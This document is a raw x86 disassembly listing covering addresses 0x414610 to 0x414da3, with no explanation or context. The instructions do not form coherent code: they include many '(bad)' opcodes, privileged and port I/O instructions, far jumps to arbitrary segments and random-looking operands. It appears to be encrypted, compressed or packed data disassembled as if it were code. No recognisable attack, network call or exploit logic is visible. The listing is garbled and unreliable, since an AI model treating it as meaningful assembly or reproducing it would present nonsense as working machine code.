  414610:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414612:	rcr    BYTE PTR [eax-0x3a],1
  414615:	std    
  414616:	or     dl,bh
  414618:	lea    ebx,[edx-0x7d]
  41461b:	gs mov ch,0xc3
  41461e:	sbb    dh,al
  414620:	push   ds
  414621:	call   0x8147ec1d
  414626:	inc    esi
  414627:	sub    ebp,ebx
  414629:	jns    0x4145e0
  41462b:	xchg   ebp,eax
  41462c:	or     DWORD PTR [ebx],ebx
  41462e:	pop    edx
  41462f:	cmc    
  414630:	jmp    0x41463f
  414632:	bswap  edx
  414634:	popf   
  414635:	iret   
  414636:	push   ebx
  414637:	ins    BYTE PTR es:[edi],dx
  414638:	adc    al,0x4a
  41463a:	xchg   DWORD PTR [eax],edx
  41463c:	leave  
  41463d:	arpl   WORD PTR [ebp+eiz*8-0x14],dx
  414641:	mov    bx,0x6095
  414645:	mov    dh,0x2e
  414647:	xchg   DWORD PTR [edx-0x8],ebx
  41464a:	seto   dl
  41464d:	or     edx,ebx
  41464f:	dec    edi
  414650:	stc    
  414651:	mov    WORD PTR [edx-0x78585885],ds
  414657:	adc    cl,al
  414659:	mov    al,0xa1
  41465b:	inc    eax
  41465c:	out    dx,eax
  41465d:	and    BYTE PTR [edx-0x8fd61e8],dh
  414663:	cmp    al,0x56
  414665:	(bad)  
  414666:	jae    0x414626
  414668:	sahf   
  414669:	dec    ebx
  41466a:	jne    0x4146e4
  41466c:	jo     0x414645
  41466e:	sbb    al,0x2
  414670:	mov    bh,0x3e
  414672:	jno    0x4146a3
  414674:	mov    ebx,0x394fc5fc
  414679:	xchg   ecx,eax
  41467a:	or     edi,DWORD PTR [edx]
  41467c:	sbb    BYTE PTR [esi-0x2c],0x94
  414680:	shr    BYTE PTR [ecx],0xd5
  414683:	inc    edi
  414684:	js     0x414638
  414686:	repz push esp
  414688:	stos   BYTE PTR es:[edi],al
  414689:	add    BYTE PTR [edi+0xb1c49b0],0x91
  414690:	sub    ch,dh
  414692:	aaa    
  414693:	inc    DWORD PTR [ebp+0x17]
  414696:	ret    0x2f9e
  414699:	dec    ecx
  41469a:	daa    
  41469b:	js     0x414660
  41469d:	pushf  
  41469e:	int3   
  41469f:	add    al,0xf7
  4146a1:	daa    
  4146a2:	ror    dl,cl
  4146a4:	das    
  4146a5:	ret    
  4146a6:	jb     0x4146b0
  4146a8:	dec    ebp
  4146a9:	addr16 loopne 0x414711
  4146ac:	stos   BYTE PTR es:[edi],al
  4146ad:	xor    BYTE PTR [ecx],dh
  4146af:	lock dec eax
  4146b1:	adc    ah,BYTE PTR [esp+eax*2-0x4f8f16dc]
  4146b8:	push   esp
  4146b9:	pop    esi
  4146ba:	adc    bl,BYTE PTR [eax+0x6f]
  4146bd:	cmp    eax,0xc9272f3b
  4146c2:	int3   
  4146c3:	pop    edx
  4146c4:	push   edx
  4146c5:	pusha  
  4146c6:	loopne 0x414648
  4146c8:	aad    0x0
  4146ca:	inc    eax
  4146cb:	icebp  
  4146cc:	push   eax
  4146cd:	test   DWORD PTR [ecx+0x48],esp
  4146d0:	xchg   esp,eax
  4146d1:	mov    ?,WORD PTR [ebx]
  4146d3:	push   esi
  4146d4:	mov    esp,0x2795b9f7
  4146d9:	mov    WORD PTR [eax],es
  4146db:	xor    ah,BYTE PTR [eax+esi*8-0x6d]
  4146df:	adc    esi,esi
  4146e1:	or     DWORD PTR [edx],edi
  4146e3:	push   0x526a0723
  4146e8:	dec    ebx
  4146e9:	push   cs
  4146ea:	in     eax,dx
  4146eb:	push   esi
  4146ec:	adc    eax,0x68b09199
  4146f1:	in     al,dx
  4146f2:	and    ebx,ecx
  4146f4:	imul   BYTE PTR [ebp-0x4a]
  4146f7:	out    dx,al
  4146f8:	push   esp
  4146f9:	shr    edi,1
  4146fb:	jecxz  0x4146ad
  4146fd:	push   ebx
  4146fe:	pop    ecx
  4146ff:	pop    edi
  414700:	in     eax,0x19
  414702:	sti    
  414703:	inc    edx
  414704:	stos   BYTE PTR es:[edi],al
  414705:	sbb    ah,al
  414707:	nop
  414708:	ins    BYTE PTR es:[di],dx
  41470a:	pop    ds
  41470b:	pop    ds
  41470c:	out    dx,al
  41470d:	pop    esp
  41470e:	out    dx,al
  41470f:	push   esi
  414710:	clts   
  414712:	cli    
  414713:	add    al,0x9
  414715:	jmp    esi
  414717:	pop    esp
  414718:	push   edx
  414719:	cld    
  41471a:	mov    ebx,0x848118b0
  41471f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414720:	fst    DWORD PTR gs:[ebp+0x4f]
  414724:	push   ebx
  414725:	imul   ebx,DWORD PTR [ebp-0x797505d1],0x48a5174
  41472f:	sub    al,0xa6
  414731:	and    dh,BYTE PTR [si+0x22]
  414735:	sub    dh,BYTE PTR [edi-0x7149e7a5]
  41473b:	sbb    al,0x92
  41473d:	mov    ch,0x38
  41473f:	(bad)  
  414740:	scas   al,BYTE PTR es:[edi]
  414741:	std    
  414742:	popa   
  414743:	outs   dx,BYTE PTR ds:[esi]
  414744:	mov    bl,0xfd
  414746:	scas   eax,DWORD PTR es:[edi]
  414747:	cmp    al,0x56
  414749:	sbb    DWORD PTR [eax],esp
  41474b:	lods   al,BYTE PTR ds:[esi]
  41474c:	aas    
  41474d:	mov    edx,0x5eb50631
  414752:	sub    al,0x72
  414754:	ja     0x414769
  414756:	cld    
  414757:	xchg   edi,eax
  414758:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41475a:	xor    eax,0xea3a2165
  41475f:	jmp    0x794c:0x214df696
  414766:	fs push cs
  414768:	or     ebp,eax
  41476a:	add    BYTE PTR [esi-0x7f],dh
  41476d:	sub    ah,BYTE PTR [edi-0x4e]
  414770:	xor    ecx,DWORD PTR [edx-0x6782822c]
  414776:	ds (bad) 
  414778:	cmp    bh,dl
  41477a:	ds jecxz 0x414776
  41477d:	push   esi
  41477e:	ins    DWORD PTR es:[edi],dx
  41477f:	or     ch,BYTE PTR [edi+0x791d3641]
  414785:	mov    eax,ds:0xfec2e113
  41478a:	add    edx,DWORD PTR [ecx]
  41478c:	mov    ds:0xf897680b,al
  414791:	inc    edx
  414792:	lea    esp,[ebp-0x4c]
  414795:	xor    BYTE PTR [eax],cl
  414797:	or     BYTE PTR [ecx-0x583b5361],ah
  41479d:	enter  0x4ecc,0x72
  4147a1:	rol    DWORD PTR cs:[ebx+0x5c],cl
  4147a5:	add    ecx,DWORD PTR [ebx]
  4147a7:	mov    ebx,DWORD PTR [esp+ecx*1]
  4147aa:	out    dx,al
  4147ab:	jmp    0x41476e
  4147ad:	rcr    BYTE PTR [eax],cl
  4147af:	sub    BYTE PTR [ecx-0x559752c9],dl
  4147b5:	out    0xcb,eax
  4147b7:	sahf   
  4147b8:	outs   dx,BYTE PTR ds:[esi]
  4147b9:	ret    0x4dcd
  4147bc:	mov    eax,ds:0xc365bb14
  4147c1:	cdq    
  4147c2:	imul   esi,esp,0xfffffffd
  4147c5:	dec    ecx
  4147c6:	(bad)  
  4147c7:	fdivrp st(6),st
  4147c9:	pop    ebp
  4147ca:	xchg   BYTE PTR [ebp+eiz*1-0x48],ah
  4147ce:	dec    edx
  4147cf:	(bad)  
  4147d0:	mov    ebp,0xba3b3c0f
  4147d5:	imul   ecx,DWORD PTR [esi-0x2b],0x4f64410b
  4147dc:	cs pop edi
  4147de:	xchg   ebx,eax
  4147df:	mov    edx,DWORD PTR [ebp-0x312cffd0]
  4147e5:	sub    BYTE PTR [esi],ch
  4147e7:	and    BYTE PTR [edi],ah
  4147e9:	mov    ecx,0x89297732
  4147ee:	cvtdq2ps xmm5,XMMWORD PTR [ecx]
  4147f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f2:	pop    edi
  4147f3:	xor    DWORD PTR [edi],ebp
  4147f5:	sub    BYTE PTR [eax+0x13121c22],al
  4147fb:	ror    ch,cl
  4147fd:	mov    ecx,0x41d0c7fc
  414802:	(bad)  
  414803:	lods   al,BYTE PTR ds:[esi]
  414804:	or     BYTE PTR [ebx],bl
  414806:	ja     0x414812
  414808:	dec    edx
  414809:	adc    ebp,edi
  41480b:	push   esi
  41480c:	dec    eax
  41480d:	call   0xcf5dd69d
  414812:	dec    ecx
  414813:	call   0x6b8426f3
  414818:	cmp    al,0xbb
  41481a:	dec    ebx
  41481b:	lock loope 0x4147c0
  41481e:	scas   eax,DWORD PTR es:[edi]
  41481f:	xchg   edi,eax
  414820:	(bad)  
  414822:	mov    ah,0xd
  414824:	sahf   
  414825:	cwde   
  414826:	sbb    DWORD PTR [ebp+0x59cb36b4],0xaa4f20ff
  414830:	(bad)  [ebp+0x52]
  414833:	fxam   
  414835:	xor    BYTE PTR [esi-0x33],0xe3
  414839:	rol    BYTE PTR [ecx],1
  41483b:	fisub  WORD PTR [esi]
  41483d:	push   ds
  41483e:	or     eax,0x5e211586
  414843:	push   edi
  414844:	or     bl,ah
  414846:	lea    edi,[eax+eiz*1]
  414849:	adc    ch,BYTE PTR [ebx+0x62bffc58]
  41484f:	fidiv  DWORD PTR [ebp-0x12052fdb]
  414855:	xor    BYTE PTR [ecx-0xb],0x50
  414859:	shl    BYTE PTR [edi],1
  41485b:	(bad)  
  41485c:	clc    
  41485d:	addr16 sbb ebp,edx
  414860:	or     DWORD PTR [edi],esi
  414862:	test   DWORD PTR [edx-0x29],ecx
  414865:	cmp    al,0x1b
  414867:	(bad)  
  414868:	pop    ss
  414869:	push   eax
  41486a:	mov    dh,0x14
  41486c:	aad    0x4d
  41486e:	scas   eax,DWORD PTR es:[edi]
  41486f:	test   BYTE PTR [esi-0x6a31d124],ah
  414875:	or     eax,0x38700cec
  41487a:	sahf   
  41487b:	jmp    0x4eb9:0x3e647c2f
  414882:	mov    al,BYTE PTR [edx]
  414884:	inc    edx
  414885:	or     ecx,DWORD PTR [ebx]
  414887:	test   DWORD PTR [ebp+0x45],ecx
  41488a:	pop    es
  41488b:	sub    DWORD PTR [ebp+edx*2+0x6a],esp
  41488f:	jo     0x414901
  414891:	imul   esp,ebx,0xf6c5160c
  414897:	das    
  414898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414899:	outs   dx,BYTE PTR ds:[esi]
  41489a:	aam    0x1b
  41489c:	stc    
  41489d:	xor    BYTE PTR [edx+0xf],bh
  4148a0:	jns    0x41490c
  4148a2:	dec    esi
  4148a3:	cli    
  4148a4:	idiv   BYTE PTR gs:[eax+0x43]
  4148a8:	dec    ebx
  4148a9:	add    eax,0xa7144df1
  4148ae:	enter  0x9eab,0x5d
  4148b2:	shr    esp,1
  4148b4:	lfs    ecx,FWORD PTR [esi+0x81cb571]
  4148bb:	push   0x6f315726
  4148c0:	shl    DWORD PTR ds:0xb6263c0b,cl
  4148c6:	dec    edi
  4148c7:	in     al,0x33
  4148c9:	imul   BYTE PTR [edx+eiz*1-0x2c]
  4148cd:	xchg   BYTE PTR [ecx+ebp*1-0x76884290],ch
  4148d4:	sbb    al,0xdf
  4148d6:	jo     0x414933
  4148d8:	xchg   ecx,eax
  4148d9:	out    0xe4,eax
  4148db:	ret    
  4148dc:	inc    ebx
  4148dd:	scas   eax,DWORD PTR es:[edi]
  4148de:	mov    fs,WORD PTR [ebx+0x66]
  4148e1:	addr16 mov ah,0x6d
  4148e4:	hlt    
  4148e5:	xchg   DWORD PTR [ebx],ebx
  4148e7:	mov    BYTE PTR [edx],dl
  4148e9:	mov    DWORD PTR [ecx+0x1d74c2a8],ebx
  4148ef:	and    al,0xc6
  4148f1:	mov    eax,0xf101b741
  4148f6:	sti    
  4148f7:	je     0x414927
  4148f9:	jmp    0xdf7ac142
  4148fe:	cmp    DWORD PTR [di-0x39],esp
  414902:	mov    ds:0xafe15c79,eax
  414907:	mov    fs,WORD PTR [ebx-0x6d4fd8dd]
  41490d:	push   esp
  41490e:	mov    ds:0x9a98e167,eax
  414913:	push   ebx
  414914:	pop    esi
  414915:	in     eax,0x23
  414917:	pop    es
  414918:	loop   0x414912
  41491a:	xor    edx,DWORD PTR [ecx+0x47]
  41491d:	xor    eax,eax
  41491f:	test   bl,ah
  414921:	ja     0x414904
  414923:	js     0x4148d8
  414925:	jnp    0x414916
  414927:	fsub   st,st(0)
  414929:	mov    esp,0x4d4c7a8a
  41492e:	mov    bl,0x1b
  414930:	push   ss
  414931:	imul   esp,esp,0xffffff86
  414934:	sbb    eax,0x5b3b5764
  414939:	lods   eax,DWORD PTR ds:[esi]
  41493a:	push   cs
  41493b:	scas   eax,DWORD PTR es:[edi]
  41493c:	dec    edx
  41493d:	push   0xbe97f032
  414942:	pop    ecx
  414943:	sbb    al,0xa
  414945:	jne    0x414945
  414947:	out    dx,eax
  414948:	jbe    0x414923
  41494a:	ror    dl,0x29
  41494d:	dec    eax
  41494e:	dec    edi
  41494f:	lock pop edx
  414951:	xlat   BYTE PTR ds:[ebx]
  414952:	or     al,0x71
  414954:	ds cdq 
  414956:	out    0x79,eax
  414958:	fmul   DWORD PTR [ebp+0x7d]
  41495b:	add    ah,BYTE PTR [eax+0x27]
  41495e:	adc    al,dl
  414960:	sti    
  414961:	pop    edx
  414962:	fs sub al,0xf1
  414965:	xor    eax,0xc82ad4ad
  41496a:	cs cmp eax,0x4f27cd42
  414970:	sub    DWORD PTR [edi],ebp
  414972:	retf   0xe7a9
  414975:	ins    DWORD PTR es:[edi],dx
  414976:	cmp    BYTE PTR [eax-0x42960240],ch
  41497c:	sbb    esi,DWORD PTR [ebp-0x72a1f1d]
  414982:	(bad)  [edx]
  414984:	jecxz  0x414959
  414986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414988:	pusha  
  414989:	or     DWORD PTR [bp+0x72],edi
  41498d:	mov    al,ds:0xb25d13e5
  414992:	bound  ebp,QWORD PTR [ebp+ecx*8+0x2b91d3bc]
  414999:	pop    ss
  41499a:	xchg   esi,eax
  41499b:	sbb    BYTE PTR [ebx-0x47],ah
  41499e:	fmul   DWORD PTR [edi]
  4149a0:	jb     0x4149ff
  4149a2:	add    eax,0xb66355fe
  4149a7:	mov    eax,0xea700ebd
  4149ac:	shl    BYTE PTR [edx+ebp*4],1
  4149af:	(bad)  
  4149b0:	repz push eax
  4149b2:	fwait
  4149b3:	jne    0x414943
  4149b5:	xchg   edx,eax
  4149b6:	bound  ebx,QWORD PTR [ecx]
  4149b8:	add    ch,ch
  4149ba:	inc    ecx
  4149bb:	xchg   esp,eax
  4149bc:	lahf   
  4149bd:	sub    bl,BYTE PTR [edi+0xb1e958f]
  4149c3:	xchg   esp,eax
  4149c4:	adc    BYTE PTR [ecx+0x51],al
  4149c7:	mov    ecx,DWORD PTR [ebx]
  4149c9:	mov    esp,0x1bba0e72
  4149ce:	push   es
  4149cf:	nop
  4149d0:	xlat   BYTE PTR ds:[ebx]
  4149d1:	xlat   BYTE PTR ds:[ebx]
  4149d2:	pcmpeqb mm3,QWORD PTR [esi]
  4149d5:	mov    dh,0xe2
  4149d7:	faddp  st(0),st
  4149d9:	xor    BYTE PTR [ecx+0x44c0d768],al
  4149df:	fwait
  4149e0:	lds    ebx,FWORD PTR [eax+0x41]
  4149e3:	push   ds
  4149e4:	mov    BYTE PTR ds:[ecx],cl
  4149e7:	add    eax,0xcf838e1d
  4149ec:	es in  eax,0xdb
  4149ef:	jge    0x414a5d
  4149f1:	pause  
  4149f3:	enter  0x1fb5,0x4b
  4149f7:	pop    ss
  4149f8:	and    BYTE PTR [eax],0x6c
  4149fb:	mov    edi,0xf326cf5b
  414a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a01:	inc    esi
  414a02:	aaa    
  414a03:	mov    ds:0x7547acc0,al
  414a08:	repnz pop ss
  414a0a:	repz test eax,0x399a769d
  414a10:	dec    eax
  414a11:	data16 (bad) 
  414a13:	sbb    al,0x2d
  414a15:	sub    cl,al
  414a17:	inc    edx
  414a18:	fwait
  414a19:	cli    
  414a1a:	push   eax
  414a1b:	add    edi,DWORD PTR [ebx+ebp*1+0x36302bcc]
  414a22:	rol    BYTE PTR [eax],cl
  414a24:	pop    esp
  414a25:	dec    edx
  414a26:	shl    BYTE PTR [eax-0x4343dd9d],cl
  414a2c:	cdq    
  414a2d:	push   0x25855d4
  414a32:	cmp    edx,DWORD PTR [ecx-0x282821e2]
  414a38:	shr    DWORD PTR [edi],0xe8
  414a3b:	in     eax,dx
  414a3c:	adc    eax,0x4871e1a3
  414a41:	icebp  
  414a42:	mov    ecx,0xc1865703
  414a47:	push   eax
  414a48:	mov    ch,0x44
  414a4a:	adc    ecx,edx
  414a4c:	mov    DWORD PTR [eax+ebp*8],edx
  414a4f:	mov    dh,0x84
  414a51:	call   0x21d1c9cb
  414a56:	shl    BYTE PTR [esi+ebp*2],1
  414a59:	gs out dx,al
  414a5b:	pop    ds
  414a5c:	nop
  414a5d:	into   
  414a5e:	pop    ecx
  414a5f:	dec    esi
  414a60:	outs   dx,DWORD PTR ds:[esi]
  414a61:	sub    DWORD PTR [edx-0x6a],ebx
  414a64:	popf   
  414a65:	adc    dl,BYTE PTR [edx]
  414a67:	jecxz  0x414ac5
  414a69:	lods   eax,DWORD PTR ds:[esi]
  414a6a:	inc    ecx
  414a6b:	fild   WORD PTR [edi-0x29]
  414a6e:	ins    DWORD PTR es:[edi],dx
  414a6f:	fidiv  WORD PTR [eax+0x7e]
  414a72:	(bad)  
  414a73:	retf   0xf832
  414a76:	mov    ah,0xd6
  414a78:	cld    
  414a79:	daa    
  414a7a:	rcr    DWORD PTR [ebx+0x73],cl
  414a7d:	mov    ds:0xa2946667,al
  414a82:	dec    edx
  414a83:	xor    al,0x6f
  414a85:	jae    0x414a9f
  414a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a88:	rcr    DWORD PTR [ebp+0x5f1c7161],0xf8
  414a8f:	lock inc esp
  414a91:	push   ecx
  414a92:	or     bh,dl
  414a94:	cmp    al,0x7b
  414a96:	cld    
  414a97:	ss mov bl,0x87
  414a9a:	aaa    
  414a9b:	sub    esi,DWORD PTR [ebx]
  414a9d:	jmp    0x414a5c
  414a9f:	mov    cl,0x6b
  414aa1:	jl     0x414a69
  414aa3:	dec    esp
  414aa4:	pusha  
  414aa5:	shr    ah,1
  414aa7:	add    BYTE PTR ds:0xfe06f693,0x52
  414aae:	mov    bh,0xd2
  414ab0:	leave  
  414ab1:	pop    esi
  414ab2:	adc    DWORD PTR [edx],edi
  414ab4:	jg     0x414b0e
  414ab6:	bound  ebp,QWORD PTR ds:0xdb8d0354
  414abc:	add    dh,al
  414abe:	sub    DWORD PTR [esi+0x6d532a94],ebx
  414ac4:	rol    DWORD PTR [eax],1
  414ac6:	add    eax,0xb513cdf8
  414acb:	dec    esp
  414acc:	inc    edi
  414acd:	mov    bl,0x4
  414acf:	test   BYTE PTR [edi-0x79d1f195],ah
  414ad5:	push   cs
  414ad6:	mov    edi,0x5e003ab9
  414adb:	jge    0x414a7b
  414add:	push   0xf8faec3d
  414ae2:	adc    BYTE PTR es:[edi],dh
  414ae5:	sbb    BYTE PTR fs:[eax+0x2f61de48],ah
  414aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aed:	inc    esp
  414aee:	sbb    dh,BYTE PTR [edx+0x3a102e6a]
  414af4:	cs lahf 
  414af6:	xchg   ebp,eax
  414af7:	jo     0x414a91
  414af9:	sbb    eax,0x654a1c42
  414afe:	imul   edx,DWORD PTR [ecx-0x72],0x2b
  414b02:	or     al,0x87
  414b04:	sub    eax,0xcf93178d
  414b09:	stos   DWORD PTR es:[edi],eax
  414b0a:	mov    ss,WORD PTR [esi]
  414b0c:	fwait
  414b0d:	mov    edi,0xf02a9070
  414b12:	pop    ss
  414b13:	push   0x7e
  414b15:	or     al,0xdc
  414b17:	lods   al,BYTE PTR ds:[esi]
  414b18:	mov    eax,0x2bb54630
  414b1d:	daa    
  414b1e:	and    cl,bh
  414b20:	xchg   DWORD PTR [edi],edx
  414b22:	ret    
  414b23:	mov    al,0xe4
  414b25:	iret   
  414b26:	(bad)  
  414b27:	fdiv   DWORD PTR [esi-0x265f3432]
  414b2d:	adc    dh,BYTE PTR [esp+ebx*8+0x74]
  414b31:	xchg   ebp,eax
  414b32:	ret    0xf3c9
  414b35:	fisub  WORD PTR [esi+0x36703cb8]
  414b3b:	clc    
  414b3c:	repnz adc edx,DWORD PTR [edi+0x167d3f2]
  414b43:	adc    DWORD PTR [ebx+0x3a0566dc],eax
  414b49:	data16 jp 0x414b9e
  414b4c:	jae    0x414b89
  414b4e:	ins    BYTE PTR es:[edi],dx
  414b4f:	mov    edx,0xd208126d
  414b54:	out    0x5e,eax
  414b56:	inc    esi
  414b57:	pop    esi
  414b58:	pop    ds
  414b59:	mov    ah,0x4b
  414b5b:	dec    ecx
  414b5c:	enter  0x3198,0xaa
  414b60:	ret    0xe5f3
  414b63:	call   0xea68:0x4105085d
  414b6a:	jecxz  0x414b8f
  414b6c:	xchg   edx,eax
  414b6d:	shr    ecx,cl
  414b6f:	or     cl,BYTE PTR [ecx-0x78949148]
  414b75:	push   0xffffffff
  414b77:	jp     0x414b56
  414b79:	iret   
  414b7a:	shr    DWORD PTR [eax],0xf2
  414b7d:	jo     0x414b22
  414b7f:	test   eax,0xfbf579e
  414b84:	icebp  
  414b85:	adc    DWORD PTR [ebx],ebx
  414b87:	sub    eax,0x8a828614
  414b8c:	(bad)  
  414b8d:	ss loopne 0x414ba9
  414b90:	shl    DWORD PTR [edx+0x7c],0xc0
  414b94:	rol    DWORD PTR [esi*4-0x7670431],1
  414b9b:	popf   
  414b9c:	jmp    0x914d:0xaccfc98b
  414ba3:	add    BYTE PTR [eax+edi*1+0x50],dl
  414ba7:	adc    eax,0x80428fd6
  414bac:	outs   dx,BYTE PTR ds:[esi]
  414bad:	stos   BYTE PTR es:[edi],al
  414bae:	ins    BYTE PTR es:[edi],dx
  414baf:	cld    
  414bb0:	cmp    BYTE PTR [ebx+0x2a1ceea0],cl
  414bb6:	inc    si
  414bb8:	add    edi,esi
  414bba:	push   cs
  414bbb:	rol    BYTE PTR [ebp-0x5924febb],0x77
  414bc2:	sub    al,0x57
  414bc4:	jne    0x414bd9
  414bc6:	push   edi
  414bc7:	fnstcw WORD PTR [edx+0x3a0cb45f]
  414bcd:	sub    al,0x95
  414bcf:	dec    edi
  414bd0:	ret    
  414bd1:	jl     0x414c07
  414bd3:	loope  0x414b85
  414bd5:	repz dec ebp
  414bd7:	xor    edi,0x38
  414bda:	ss das 
  414bdc:	(bad)  
  414bdd:	pop    ecx
  414bde:	pop    ss
  414bdf:	jg     0x414bdb
  414be1:	jle    0x414b85
  414be3:	(bad)  
  414be4:	sub    al,0x6
  414be6:	xchg   esi,eax
  414be7:	jle    0x414be3
  414be9:	dec    ebp
  414bea:	int    0xda
  414bec:	ret    0xe573
  414bef:	loopne 0x414c47
  414bf1:	mov    ds:0x47174e46,al
  414bf6:	sub    eax,0xc3a8943f
  414bfb:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  414bfd:	bound  eax,QWORD PTR [eax]
  414bff:	pop    esi
  414c00:	mov    DWORD PTR [edx+0x37],eax
  414c03:	jb     0x414c15
  414c05:	cmc    
  414c06:	dec    esp
  414c07:	and    BYTE PTR [esi-0x71],dh
  414c0a:	std    
  414c0b:	xchg   DWORD PTR [edx-0x6069793c],eax
  414c11:	aas    
  414c12:	sub    ebp,DWORD PTR [edx]
  414c14:	or     al,BYTE PTR [edx+0x35a8b366]
  414c1a:	js     0x414c26
  414c1c:	(bad)  
  414c1e:	loopne 0x414c93
  414c20:	scas   eax,DWORD PTR es:[edi]
  414c21:	mov    edi,0x5adf689b
  414c26:	push   ds
  414c27:	retf   0xbcc0
  414c2a:	std    
  414c2b:	lods   al,BYTE PTR ds:[esi]
  414c2c:	gs fwait
  414c2e:	std    
  414c2f:	arpl   WORD PTR [ecx-0x8],dx
  414c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c33:	mov    ch,0xde
  414c35:	xchg   BYTE PTR ds:0x8de0f01c,dh
  414c3b:	scas   al,BYTE PTR es:[edi]
  414c3c:	sbb    eax,0xcb7a1e58
  414c41:	fwait
  414c42:	(bad)  
  414c43:	cmp    al,0x33
  414c45:	pop    esi
  414c46:	sub    ah,ah
  414c48:	in     al,0x27
  414c4a:	mov    ecx,0xd5df4b16
  414c4f:	fadd   QWORD PTR [ecx]
  414c51:	fstp   DWORD PTR [eax-0x4ed0d05d]
  414c57:	das    
  414c58:	jmp    0xae435766
  414c5d:	(bad)  
  414c5e:	mov    ah,0x7f
  414c60:	cmp    DWORD PTR [ebx],edi
  414c62:	xchg   edi,eax
  414c63:	aas    
  414c64:	dec    ebx
  414c65:	ret    
  414c66:	call   0x4878f756
  414c6b:	push   ss
  414c6c:	fbstp  TBYTE PTR [esi+esi*4-0x52]
  414c70:	mov    al,ds:0x906e297d
  414c75:	push   0x69
  414c77:	cli    
  414c78:	fnstcw WORD PTR [ecx+0x63948b55]
  414c7e:	in     al,0xa8
  414c80:	pop    edx
  414c81:	jno    0x414cd1
  414c83:	pop    ds
  414c84:	sub    bl,BYTE PTR [esi]
  414c86:	fdivr  st,st(4)
  414c88:	fidivr WORD PTR [ebp+0x264f950e]
  414c8e:	push   ss
  414c8f:	call   0xc8ef:0x2a491c1b
  414c96:	mov    dl,0xb8
  414c98:	das    
  414c99:	outs   dx,BYTE PTR ds:[esi]
  414c9a:	mov    al,0xe1
  414c9c:	pop    esi
  414c9d:	les    ebp,FWORD PTR [ebp+edi*8-0x29]
  414ca1:	je     0x414cf8
  414ca3:	and    bh,BYTE PTR [ebx+0x11]
  414ca6:	fistp  QWORD PTR [ebp+0x2e]
  414ca9:	xlat   BYTE PTR ds:[ebx]
  414caa:	cmc    
  414cab:	push   edx
  414cac:	xor    esp,DWORD PTR [edi-0x47bacdc2]
  414cb2:	mov    ebp,0xd7aadf4
  414cb7:	(bad)  
  414cb8:	cli    
  414cb9:	or     al,0xbb
  414cbb:	jno    0x414c98
  414cbd:	inc    ebx
  414cbe:	add    BYTE PTR [esi+0x4a],dh
  414cc1:	stc    
  414cc2:	mov    eax,0xde49a9a0
  414cc7:	aas    
  414cc8:	call   0x6cb9fb6c
  414ccd:	iret   
  414cce:	sub    dh,bh
  414cd0:	(bad)  
  414cd1:	mov    edx,0x951e555e
  414cd6:	pop    esp
  414cd7:	sbb    cl,BYTE PTR [edi]
  414cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cda:	mov    al,0x90
  414cdc:	pop    edi
  414cdd:	push   cs
  414cde:	mov    esi,0x95b49cd5
  414ce3:	and    eax,0xec52ef30
  414ce8:	add    DWORD PTR [ebp-0x1c913c05],esp
  414cee:	jle    0x414cd2
  414cf0:	mov    WORD PTR [edi+0x66],fs
  414cf3:	leave  
  414cf4:	cmp    al,0xbe
  414cf6:	bound  edx,QWORD PTR [esi]
  414cf8:	fdivr  DWORD PTR [ebx+0x4b]
  414cfb:	call   0xdfac29b1
  414d00:	xchg   BYTE PTR [ecx],ah
  414d02:	sub    BYTE PTR [eax],cl
  414d04:	cld    
  414d05:	in     al,0xff
  414d07:	jo     0x414d7c
  414d09:	fwait
  414d0a:	pop    esi
  414d0b:	fcomp  DWORD PTR [ecx]
  414d0d:	or     cl,BYTE PTR [edi+0x6a62b253]
  414d13:	arpl   WORD PTR [eax],ax
  414d15:	sbb    DWORD PTR [edi-0x3d],ebp
  414d18:	sub    ebx,DWORD PTR [edx]
  414d1a:	sub    ebx,esp
  414d1c:	adc    edx,edi
  414d1e:	in     al,dx
  414d1f:	xor    dh,BYTE PTR [eax-0x66844e82]
  414d25:	push   edx
  414d26:	push   cs
  414d27:	xchg   esi,eax
  414d28:	adc    DWORD PTR [edx+0x7677de29],ebp
  414d2e:	loope  0x414cd4
  414d30:	and    eax,0xf4e1e03c
  414d35:	push   ds
  414d36:	add    bh,ah
  414d38:	adc    ecx,ecx
  414d3a:	test   eax,0xc641cf1f
  414d3f:	xchg   esi,eax
  414d40:	rdpmc  
  414d42:	icebp  
  414d43:	mov    ebp,0xb1e60e6f
  414d48:	out    dx,al
  414d49:	jmp    0x414d18
  414d4b:	mov    dl,0x53
  414d4d:	pop    edi
  414d4e:	dec    ebp
  414d4f:	lods   eax,DWORD PTR ds:[esi]
  414d50:	add    BYTE PTR [edi],dh
  414d52:	mov    al,0x1c
  414d54:	mov    ebp,DWORD PTR [edx+eiz*4+0x39d365a3]
  414d5b:	loopne 0x414cff
  414d5d:	mov    dl,0xec
  414d5f:	mov    al,0x68
  414d61:	mov    ah,0xdd
  414d63:	mov    eax,0x2204d584
  414d68:	nop
  414d69:	es xchg ebp,ebx
  414d6c:	xchg   esp,eax
  414d6d:	or     al,0x60
  414d6f:	jae    0x414d74
  414d71:	push   0xffffffd6
  414d73:	xchg   ecx,eax
  414d74:	lods   al,BYTE PTR ds:[esi]
  414d75:	lock test BYTE PTR [ebx-0x16],dl
  414d79:	cmp    DWORD PTR [esi-0x1b],edi
  414d7c:	enter  0x25d1,0x2b
  414d80:	jl     0x414db1
  414d82:	rcr    eax,0xed
  414d85:	adc    ebx,ebx
  414d87:	jnp    0x414d3b
  414d89:	add    al,0x58
  414d8b:	iret   
  414d8c:	or     BYTE PTR [esi],al
  414d8e:	mov    al,0xfa
  414d90:	lods   al,BYTE PTR ds:[esi]
  414d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d92:	xor    al,0x23
  414d94:	std    
  414d95:	xchg   edi,eax
  414d96:	jge    0x414e0e
  414d98:	out    dx,al
  414d99:	mov    es,WORD PTR [esi-0x61]
  414d9c:	xor    eax,0x5542288b
  414da1:	sub    ah,dl
  414da3:	pop    esp
